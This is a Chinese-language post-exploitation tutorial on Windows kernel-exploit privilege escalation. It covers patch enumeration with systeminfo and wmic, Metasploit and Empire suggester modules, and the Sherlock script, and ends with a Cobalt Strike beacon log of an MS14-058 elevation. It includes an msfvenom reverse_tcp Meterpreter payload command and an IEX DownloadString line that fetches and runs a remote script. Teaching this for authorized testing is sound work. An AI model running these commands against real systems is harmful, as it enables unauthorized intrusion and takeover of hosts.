## 文章前言
在后渗透测试阶段，权限提升是一个绕不开的话题，其中"系统内核溢出提权"因其利用便捷成为了最为常用的方法，在使用该方法提权时我们只需要去查看目标系统中打了那些系统补丁，之后去找补丁的"互补"补丁，并利用对应的提权类的漏洞实现权限提升，本篇文章主要围绕"系统内核溢出提权"的一些方法、思路进行简易介绍~
## 权限查看
在获取到目标系统的shell后，我们需要先确认以下当前用户以及用户权限，这一点可以通过在shell中输入"whoami"以及"whoami
/groups"来确定：
    whoami
    whoami /groups
从上面的显示结果可以看到当前用户为" win-op8vb0nlure\al1ex",权限为"Mandatory Label\Medium Mandatory
Level"，而这里的"Mandatory Label\Medium Mandatory
Level"是一个标准的普通用户权限，而我们再提权阶段要做得就是将此处的"Medium Mandatory Level"提升为"High Mandatory
Level"。
## 补丁查询
利用系统溢出漏洞进行提权的关键是通过查看系统的补丁信息来找寻缺失的、可以利用来提权的补丁进行提权，下面介绍几种常见的补丁查询思路与方法
### 系统命令查看
在Windows操作系统中我们可以通过执行systeminfo来查看目标机器上安装的补丁信息：
    systeminfo
从上图可以看到这里安装了三个补丁：
  * [01]: KB2534111
  * [02]: KB2999226
  * [03]: KB976902
同时我们也可以通过WMIC来快速查看当前系统安装的补丁信息(尤其是在域控上)：
    wmic qfe get Caption,Description,HotFixID,InstalledOn
如果想要查询系统是否安装某一个特定的补丁，可以通过以下命令进行简易查询：
    wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /c:"KB2534111" /c:"KB976902"
既然已经确定了当前系统的补丁信息，那么后续如何利用呢？当然是去查找缺失的、可以利用的补丁了！但是怎么找呢？不可能在茫茫大海中找吧？当然不是，这里推荐一个辅助网站：  
我们可以在"补丁号"选项框中输入当前系统的补丁信息，之后进行查询来获取当前系统的缺失的、可以利用的补丁信息，这里以上面查询的补丁信息为例：  
之后可以根据补丁来推荐相关的漏洞利用EXP，不过在使用EXP时还需要主要影响的操作系统：  
关于提权类的EXP，这里推荐一个项目：  
该项目源自SecWiki维护的Windows-kernel-exploit，但是由于原作者不再更新与维护所以后期由笔者重新进行构建维护，同时也涵盖了Bypass
UAC系列，目前还在不断的更新与完善中，同时该项目也主要用于收集网络上公开的各大有价值的漏洞EXP/POC~
### MSF框架查看
MSF框架中自带提权辅助功能模块——post/windows/gather/enum_pathes，该模块会根据漏洞编号快速查找目标系统中的补丁信息，下面以目标主机为例做一个简单的演示：  
首先，我们需要获取目标主机的一个Shell，这里我们再测试环境中直接通过MSFvenom来生成Payload：
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.188.129 LPORT=4444 -f exe > shell.exe
之后在MSF中设置监听：  
之后再目标主机中执行EXE  
之后成功返回会话：  
之后再Meterpreter中执行如下命令即可查看系统补丁信息(老版本的会给出可用的EXP，MSF5好像不提供了)：
    run post/windows/gather/enum_patches
于此同时，我们也可以通过执行以下命令来查看目标系统可用的漏洞，之后探寻提权EXP:
    run post/multi/recon/local_exploit_suggester
### Empire内置模块
Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法，下面进行简单演示：
    usemodule privesc/powerup/allchecks
    execute
PS:总体来看效果不是很理想，不如MSF~
## PowerShell脚本
Sherlock(
  * MS10-015 : User Mode to Ring (KiTrap0D)
  * MS10-092 : Task Scheduler
  * MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow
  * MS13-081 : TrackPopupMenuEx Win32k NULL Page
  * MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference
  * MS15-051 : ClientCopyImage Win32k
  * MS15-078 : Font Driver Buffer Overflow
  * MS16-016 : 'mrxdav.sys' WebDAV
  * MS16-032 : Secondary Logon Handle
  * MS16-034 : Windows Kernel-Mode Drivers EoP
  * MS16-135 : Win32k Elevation of Privilege
  * CVE-2017-7199 : Nessus Agent 6.6.2 - 6.10.3 Priv Esc  
该工具的利用也是较为简单，首先下载项目到本地，之后再终端调用Sherlock(获取webshell的主机中直接上传即可)：
    Import-Module .\Sherlock.ps1
当然也可以远程加载：
    IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
之后执行以下命令来列举当前系统中所有可利用的漏洞：
    Find-AllVulns
当然你也可以搜索某一个特定漏洞，例如：
    Find-CVE20177199
根据Sherlock的说明目前CS已经可以实现" 导入模块——>查询单一漏洞——>直接提权 "的一套流程了，下面是Github中的实例：
    beacon> getuid
    [*] Tasked beacon to get userid
    [+] host called home, sent: 20 bytes
    [*] You are Win7-x64\Rasta
    beacon> powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1
    [*] Tasked beacon to import: C:\Users\Rasta\Desktop\Sherlock.ps1
    [+] host called home, sent: 2960 bytes
    beacon> powershell Find-MS14058
    [*] Tasked beacon to run: Find-MS14058
    [+] host called home, sent: 20 bytes
    [+] received output:
    Title      : TrackPopupMenu Win32k Null Pointer Dereference
    MSBulletin : MS14-058
    CVEID      : 2014-4113
    Link       : https://www.exploit-db.com/exploits/35101/
    VulnStatus : Appears Vulnerable
    beacon> elevate ms14-058 smb
    [*] Tasked beacon to elevate and spawn windows/beacon_smb/bind_pipe (127.0.0.1:1337)
    [+] host called home, sent: 105015 bytes
    [+] received output:
    [*] Getting Windows version...
    [*] Solving symbols...
    [*] Requesting Kernel loaded modules...